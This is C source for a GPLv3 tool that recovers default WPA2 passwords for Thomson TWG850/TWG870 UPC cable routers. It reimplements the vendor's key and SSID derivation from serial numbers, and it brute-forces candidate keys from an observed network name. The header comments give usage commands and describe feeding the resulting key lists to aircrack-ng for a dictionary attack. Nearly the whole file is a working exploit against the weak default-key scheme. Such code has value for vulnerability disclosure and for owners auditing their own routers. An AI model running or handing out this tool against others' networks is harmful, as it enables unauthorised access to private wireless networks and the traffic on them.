/**
 * WPA2 key-recovery for Thomson TWG8{5,7}0 UPC%0{6,7}d networks
 * Copyright (C) 2016 Joseph C. Lehner <joseph.c.lehner@gmail.com>
 *
 * Licensed under the GNU GPLv3.
 *
 * As in the Technicolor TC7200.U, the Wi-Fi SSID and
 * password are derived from the device's serial number.
 * However, for the TWG850-4U, there are around 8000-12000
 * possible WPA2 keys for each UPC%06d network, as opposed
 * to ~20 keys in the TC7200.U (but still good enough for
 * a dictionary attack: aircrack-ng does it in ~4 seconds
 * on a Core i5-6600).
 *
 * The WiFi channel number is also derived from the serial
 * number, but in such a way that it's guaranteed to be either
 * channel 1 or 6 (or 11, but the algorithm used almost never
 * generates channel 11). The distribution is 1/3 channel 1,
 * and 2/3 channel 6. The channel number printed on the bottom
 * label is _not_ used!
 *
 * $ cc upc-twg8x0.c -o upc-twg8x0
 *
 * Print WPA2 key and SSID for a TWG850 serial number 00939-907201352
 * $ ./upc-twg8x0 twg850 00930907201352
 *
 * Get serial numbers and WPA2 keys for SSID UPC009065
 * $ ./upc-twg8x0 twg850 UPC009065
 *
 * Same as above, but limit search to channel 6
 * $ ./upc-twg8x0 twg850 UPC009065 6
 */

#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>

static int opt_alt_algo = 0;

static uint32_t to_u32(char *s, size_t beg, size_t len)
{
	char c, *end;
	end	= &s[beg + len];
	c = *end;
	*end = '\0';

	long n = atol(s + beg);
	*end = c;
	return n;
}

static void strrev(char *dest, const char *src)
{
	size_t i, len = strlen(src);
	for (i = 0; i < len; ++i) {
		dest[len - i - 1] = src[i];
	}
	dest[len] = '\0';
}

static void split_sn(char *s, uint32_t *sn)
{
	size_t len = strlen(s);

	if (len == 14) {
		// "11111233455555" -> { 11111, 2, 33, 4, 55555 }

		sn[5] = 0;

		sn[0] = to_u32(s, 0, 5);
		sn[1] = to_u32(s, 5, 1);
		sn[2] = to_u32(s, 6, 2);
		sn[3] = to_u32(s, 8, 1);
		sn[4] = to_u32(s, 9, 5);
	} else if (len == 12) {
		// "SAAP12345678" -> { 8765, 4, 32, 1, 33905 }
		// "SBAP12345678" -> { 8765, 4, 32, 1, 33915 }
		// "SAPP12345678" -> { 8765, 4, 32, 1, 35405 }

		char rev[13];
		strrev(rev, s);

		sn[5] = 1;

		sn[0] = to_u32(rev, 0, 4);
		sn[1] = to_u32(rev, 4, 1);
		sn[2] = to_u32(rev, 5, 2);
		sn[3] = to_u32(rev, 7, 1);

		uint32_t v1 = 0;
		size_t i = 8;

		for (; i < 12; ++i) {
			uint32_t v0 = ((v1 << 2) + v1) << 1;
			v1 = v0 + (rev[i] - '0');
		}

		sn[4] = v1;
	}
}

static void generate_upc_psk_twg8x0(uint32_t *sn, char *psk)
{
	char base[9];
	snprintf(base, 9, "%08d", (sn[1] * 1000 + sn[2] * 10 + sn[3]) * sn[4] * 11 % 100000000);

	int32_t i = 0;
	for (i = 0; i < 8; i++) {
		psk[i] = base[i] * base[(i + 1) % 8] % 26 + 0x41;
	}
}

static uint32_t generate_upc_ssid_twg850(uint32_t *sn)
{
	uint32_t s1 = !opt_alt_algo ? 0 : 1;
	uint32_t ssid = 0;

	if (s1) {
		ssid = sn[0] * 4 + sn[1] * sn[1] * sn[1] + sn[2] * 7 + sn[3] * 2047 + (sn[4] % 93) * (sn[4] % 93);
	} else {
		ssid = sn[0] * 3 + sn[1] * sn[1] + sn[2] * 9 + sn[3] * 1023 + sn[4] * 3 + 1;
	}

	return ssid % 9999999 + 1;
}

/*
// this algo is _not_ used by the UPC-branded firmware used in the TC7200.U
static uint32_t generate_upc_ssid_tc7200(uint32_t *sn)
{
	uint32_t a2;
	uint32_t s0 = !opt_alt_algo ? 4 : 0;

	a2 = sn[1] * 2500000 + (sn[2] * 10 + sn[3]) * 6800 + sn[4];
	if (s0 >= 4) {
		a2 += 0xff8d8f20; // -7500000
	} else {
		a2 += 0xffd9da60; // -2500000
	}

	return a2 % 10000000;
}
*/

static uint32_t generate_upc_ssid_twg870(uint32_t *sn)
{
	uint32_t s0;
	uint32_t s1 = !opt_alt_algo ? 0 : 1;

	if (!s1) {
		s0 = sn[0] * 37 + sn[1] * sn[1] + sn[2] * 9 + sn[3] * 1023 + sn[4] * 3 + 1;
	} else if (s1 == 1) {
		s0 = sn[0] * 47 + sn[1] * sn[1] * sn[1] + sn[2] * 7 + sn[3] * 2047 + sn[4] * 5 + (sn[4] % 93) * (sn[4] % 93);
	}

	return s0 % 9999999 + 1;
}

static uint32_t generate_upc_channel_twg850(uint32_t *sn)
{
	switch (sn[4] % 3) {
		case 0:
			return 1;
		case 1:
			return 11;
		case 2:
			return 6;
	}
}

static uint32_t generate_upc_channel_twg870(uint32_t *sn)
{
	switch (sn[4] % 3) {
		case 0:
			return 1;
		case 1:
			return 6;
		case 2:
			return 11;
	}
}

static uint32_t generate_upc_channel_dummy(uint32_t *sn)
{
	return 0;
}

static void generate_upc_psk_dummy(uint32_t *sn, char *psk)
{
	strcpy(psk, "--------");
}

static uint32_t (*generate_upc_ssid)(uint32_t *) = NULL;
static uint32_t (*generate_upc_channel)(uint32_t *) = NULL;
static void (*generate_upc_psk)(uint32_t *, char *) = NULL;
static const char *ssid_fmt = NULL;

static uint32_t prefixes_twg850[] = { 913, 926, 939, 0 };
static uint32_t prefixes_twg870[] = { 955, 0 };
static uint32_t prefixes_tc7200[] = { 33905, 33915, 35405 };

static void print(uint32_t *sn, uint32_t ssid, uint32_t ch)
{
	if (!ch) {
		ch = generate_upc_channel(sn);
	}

	if (sn[5] == 0) {
		printf("%05d-%d%02d%d%05d  ", sn[0], sn[1], sn[2], sn[3], sn[4]);
	} else if (sn[5] == 1) {
		switch (sn[4]) {
			case 33905:
				printf("SAAP");
				break;
			case 33915:
				printf("SABP");
				break;
			case 35405:
				printf("SAPP");
				break;
			default:
				printf("%05d-", sn[4]);
		}

		char snbuf[32] = { 0 };
		char rev[32] = { 0 };

		snprintf(snbuf, 31, "%04d%d%02d%d", sn[0], sn[1], sn[2], sn[3]);
		strrev(rev, snbuf);
		printf("%s  ", rev);
	}

	printf("%-2d  ", ch);
	printf(ssid_fmt, ssid);

	char psk[9];
	generate_upc_psk(sn, psk);
	printf("%.8s  ", psk);

	printf("\n");
}

static int strbeg(const char *haystack, const char *needle)
{
	return strstr(haystack, needle) == haystack;
}

static void usage()
{
	fprintf(stderr, "usage: upc-twg8x0 <device> <<serial> | <ssid> [<channel>]>\n");
	exit(1);
}

int main(int argc, char **argv)
{
	if (argc != 3 && argc != 4) {
		usage();
	}

	uint32_t *prefixes = NULL;

	if (strbeg(argv[1], "twg850")) {
		ssid_fmt = "UPC%06d  ";
		prefixes = prefixes_twg850;
		generate_upc_ssid = &generate_upc_ssid_twg850;
		generate_upc_channel = &generate_upc_channel_twg850;
		generate_upc_psk = &generate_upc_psk_twg8x0;
	} else if (strbeg(argv[1], "twg870")) {
		ssid_fmt = "UPC%07d  ";
		prefixes = prefixes_twg870;
		generate_upc_ssid = &generate_upc_ssid_twg870;
		generate_upc_channel = &generate_upc_channel_twg870;
		generate_upc_psk = &generate_upc_psk_twg8x0;
	} else if (strbeg(argv[1], "tc7200")) {
		ssid_fmt = "UPC%07d  ";
		prefixes = prefixes_tc7200;
		// 5 Ghz SSID
		generate_upc_ssid = &generate_upc_ssid_twg870;
		generate_upc_channel = &generate_upc_channel_dummy;
		generate_upc_psk = &generate_upc_psk_dummy;
	} else {
		fprintf(stderr, "error: unknown device %s\n", argv[1]);
		return 1;
	}

	if (strstr(argv[1], "_alt")) {
		opt_alt_algo = 1;
	}

	// sn[5] is (ab)used to store the serial number type:
	// 0 = TWG8x0
	// 1 = TC7200.U (the TC7200.20 uses serial numbers like the TWG8x0)
	uint32_t sn[6] = { 0 };
	uint32_t *sn0, *sn1, *sn2, *sn3, *sn4;

	if (prefixes == prefixes_tc7200) {
		sn[5] = 1;
		sn0 = sn + 4;
		sn1 = sn + 3;
		sn2 = sn + 2;
		sn3 = sn + 1;
		sn4 = sn;
	} else {
		sn0 = sn;
		sn1 = sn + 1;
		sn2 = sn + 2;
		sn3 = sn + 3;
		sn4 = sn + 4;
	}

	uint32_t ssid = 0;
	uint32_t ch = 0;

	size_t snlen = strlen(argv[2]);

	if (sscanf(argv[2], "UPC%d", &ssid) == 1) {
		if (argc == 4) {
			ch = atoi(argv[3]);
		}

		unsigned i = 0;

		for (; prefixes[i]; ++i) {
			*sn0 = prefixes[i];

			for (*sn1 = 0; *sn1 <= 9; *sn1 += 1)
			for (*sn2 = 0; *sn2 <= 99; *sn2 += 1)
			for (*sn3 = 0; *sn3 <= 9; *sn3 += 1)
			for (*sn4 = 0; *sn4 <= 9999; *sn4 += 1) {
				if (ssid != generate_upc_ssid(sn)) {
					continue;
				}

				if (ch && ch != generate_upc_channel(sn)) {
					continue;
				}

				print(sn, ssid, ch);
			}
		}
	} else if (snlen == 12 || snlen == 14) {
		split_sn(argv[2], sn);
		ssid = generate_upc_ssid(sn);
		print(sn, ssid, 0);
	} else {
		usage();
	}

	return 0;
}
